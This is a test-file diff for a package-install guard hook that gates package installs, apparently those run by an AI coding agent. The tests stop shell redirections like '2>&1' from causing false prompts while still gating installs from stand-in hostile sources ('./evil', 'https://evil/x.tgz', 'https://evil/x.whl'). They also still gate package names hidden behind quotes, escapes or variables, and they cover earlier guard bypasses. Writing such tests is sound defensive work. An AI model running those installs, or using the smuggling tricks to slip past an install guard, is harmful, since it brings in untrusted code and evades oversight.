@@ -29,6 +29,7 @@ import {
   checkOsvAdvisory,
   publishDateFromRegistryJson,
   installSegments,
+  stripFdRedirects,
   unpinnedPipPackages,
 } from '../package-install-guard.js';
 
@@ -2059,6 +2060,164 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
         const cwd = await binDir(await tempRoot(), ['zz-lodahs-c3']);
         expect(await runHook(make(await tempRoot()), { stub: FRESH, cwd })).toBe('deny');
       });
+    });
+  });
+
+  // ----- 2026-11-05: file-descriptor redirections are not install sources (candidate strip-fd-redirects) -----
+  // `npm ci 2>&1` was asked as "Non-registry source: 2>": the `&` split left the word `2>`. Only a pure fd
+  // redirection (N>&M, >&N, N>&-, and a redirect to /dev/null, or $null in PowerShell) is removed, outside
+  // quotes and escapes. Any other `>` word (a file target, a variable target) stays and still asks.
+  describe('fd redirections are not install sources', () => {
+    async function lockDir(withLockfile: boolean): Promise<string> {
+      const { mkdtempSync, writeFileSync } = await import('node:fs');
+      const { tmpdir } = await import('node:os');
+      const { join } = await import('node:path');
+      const dir = mkdtempSync(join(tmpdir(), 'pig-fdredir-'));
+      if (withLockfile) writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
+      return dir;
+    }
+
+    it.each([
+      'npm ci 2>&1',
+      'npm ci --ignore-scripts --no-audit --no-fund 2>&1',
+      'npm ci --ignore-scripts --no-audit --no-fund 2>&1 | tail -5',
+      'npm ci 2>&1 --no-audit',
+      '2>&1 npm ci',
+      'npm ci 2>/dev/null',
+      'npm ci 2> /dev/null',
+      'npm ci >/dev/null 2>&1',
+      'npm ci > /dev/null 2>&1',
+      'npm ci 1>&2',
+      'npm ci >&2',
+      'npm ci 2>&-',
+      'npm ci &>/dev/null',
+      'npm ci &> /dev/null',
+      '(npm ci 2>&1)',
+      'pnpm install --frozen-lockfile 2>&1',
+      'yarn install 2>&1',
+      'pip install -r requirements.txt 2>&1',
+      'bash -c "npm ci 2>&1"',
+    ])('allows %j in a folder with a lockfile', async (cmd) => {
+      const r = await runHookFull(cmd, { stub: FRESH, cwd: await lockDir(true) });
+      expect(r.reason).not.toMatch(/Non-registry source/);
+      expect(r.decision).toBeUndefined();
+    });
+
+    it.each([
+      'npm ci 2>$null',
+      'npm ci *>&1',
+      'npm ci 2>&1 | Out-Null',
+      'npm ci *>$null',
+    ])('allows %j in PowerShell in a folder with a lockfile', async (cmd) => {
+      const r = await runHookFull(cmd, { tool: 'PowerShell', stub: FRESH, cwd: await lockDir(true) });
+      expect(r.reason).not.toMatch(/Non-registry source/);
+      expect(r.decision).toBeUndefined();
+    });
+
+    it('PowerShell Set-Location then npm ci 2>&1 still asks for the folder, but no longer for the redirect', async () => {
+      const dir = await lockDir(true);
+      const r = await runHookFull(`Set-Location ${dir.replace(/\\/g, '/')}; npm ci --ignore-scripts --no-audit --no-fund 2>&1`, { tool: 'PowerShell', stub: FRESH, cwd: dir });
+      gated(r.decision);
+      expect(r.reason).toMatch(/folder the guard cannot vouch for/i);
+      expect(r.reason).not.toMatch(/Non-registry source/);
+    });
+
+    it('npm ci 2>&1 with no lockfile still asks', async () => {
+      gated(await runHook('npm ci --ignore-scripts 2>&1', { stub: FRESH, cwd: await lockDir(false) }));
+    });
+
+    // Must-still-block: removing the redirect must not hide a source or a package.
+    it.each([
+      'npm install ./evil 2>&1',
+      'npm install git+https://x/y 2>&1',
+      'npm install 2>&1 https://evil/x.tgz',
+      'npm install 2>&1 ./evil',
+      'npm install github:user/repo 2>/dev/null',
+      'npm install file:../evil >/dev/null 2>&1',
+      'npm i foo 2>file.tgz',
+      'npm i foo 2>err.log',
+      'npm ci 2>$FD',
+      'npm ci 2>&$FD',
+      'npm install 2>&1 zz-fresh-pkg',
+      'npm install zz-fresh-pkg 2>&1',
+      'npm ci 2>&1; npm install zz-fresh-pkg',
+      'npm ci > /dev/null; npm install zz-fresh-pkg',
+      'pip install https://evil/x.whl 2>&1',
+      "npm install '2>&1'",
+      'npm install "2>&1"',
+      'npm install 2\\>\\&1',
+      "npm install '2>/dev/null'",
+      "R='2>&1'; npm install $R",
+      'npm install "$R"',
+    ])('still gates %j', async (cmd) => {
+      gated(await runHook(cmd, { stub: FRESH, cwd: await lockDir(true) }));
+    });
+
+    it('still gates a package named after a redirect in PowerShell, quoted or backtick-escaped', async () => {
+      for (const cmd of ["npm install '2>&1'", 'npm install `2>&1', 'npm install "2>&1"']) {
+        gated(await runHook(cmd, { tool: 'PowerShell', stub: FRESH, cwd: await lockDir(true) }));
+      }
+    });
+
+    it('a redirect inside a quoted string is not removed', async () => {
+      // The quoted text holds the install, so no segment runs it; the payload of bash -c does run, redirect or not.
+      expect(await runHook('echo "npm install zz-fresh-pkg 2>&1"', { stub: FRESH, cwd: await lockDir(true) })).toBeUndefined();
+      gated(await runHook('bash -c "npm install zz-fresh-pkg 2>&1"', { stub: FRESH, cwd: await lockDir(true) }));
+    });
+
+    // The quote and escape tracking, read on the function itself. In the built hook a stripped quoted string
+    // still gates (it keeps a space), so only the text shows whether the tracking works.
+    describe('stripFdRedirects text', () => {
+      it.each([
+        ['npm ci 2>&1', 'npm ci '],
+        ['npm ci >/dev/null 2>&1 | tail', 'npm ci   | tail'],
+        ['npm ci &> /dev/null', 'npm ci '],
+      ])('removes the bare redirect in %j', (cmd, want) => {
+        expect(stripFdRedirects(cmd)).toBe(want);
+      });
+
+      it.each([
+        ['echo "a 2>&1 b"', 'Bash'],
+        ["echo 'a 2>/dev/null b'", 'Bash'],
+        ['echo "a\\" 2>&1 b"', 'Bash'],
+        ['echo "a 2>&1', 'Bash'],
+        ['echo a2>&1', 'Bash'],
+        ['echo "a" 2>err.log', 'Bash'],
+        ['echo a > out.txt', 'Bash'],
+        ['echo a 2>$FD', 'Bash'],
+        ['echo a 2>$null', 'Bash'],
+        ['echo "a 2>&1 b"', 'PowerShell'],
+        ["echo 'a 2>$null b'", 'PowerShell'],
+        ['echo "a`" 2>&1 b"', 'PowerShell'],
+        ['echo a 2>err.log', 'PowerShell'],
+      ])('keeps %j as typed (%s)', (cmd, tool) => {
+        expect(stripFdRedirects(cmd, tool)).toBe(cmd);
+      });
+
+      it('a backslash inside single quotes is not an escape in Bash, so the redirect after the quote goes', () => {
+        expect(stripFdRedirects("echo 'a\\' 2>&1")).toBe("echo 'a\\' ");
+      });
+
+      it('a backtick inside single quotes is not an escape in PowerShell, so the redirect after the quote goes', () => {
+        expect(stripFdRedirects("echo 'a`' 2>&1", 'PowerShell')).toBe("echo 'a`' ");
+      });
+    });
+
+    // Judge additions (2026-11-05).
+    it('a &>/dev/null redirect before a fresh package no longer hides the package', async () => {
+      // Base allowed this: the lone & cut the segment and the package fell into a non-install segment.
+      expect(await runHook('npm install &>/dev/null zz-fresh-pkg', { stub: FRESH, cwd: await lockDir(true) })).toBe('deny');
+    });
+
+    it('a custom registry after a redirect names the URL, not the redirect', async () => {
+      const r = await runHookFull('npm install --registry 2>&1 https://e.invalid/', { stub: FRESH, cwd: await lockDir(true) });
+      expect(r.decision).toBe('ask');
+      expect(r.reason).toMatch(/e\.invalid/);
+      expect(r.reason).not.toMatch(/--registry 2>/);
+    });
+
+    it('a PowerShell install of ./evil behind a backtick-escaped 2>&1 is gated', async () => {
+      gated(await runHook('npm install `2>&1 ./evil', { tool: 'PowerShell', stub: FRESH, cwd: await lockDir(true) }));
     });
   });
 });
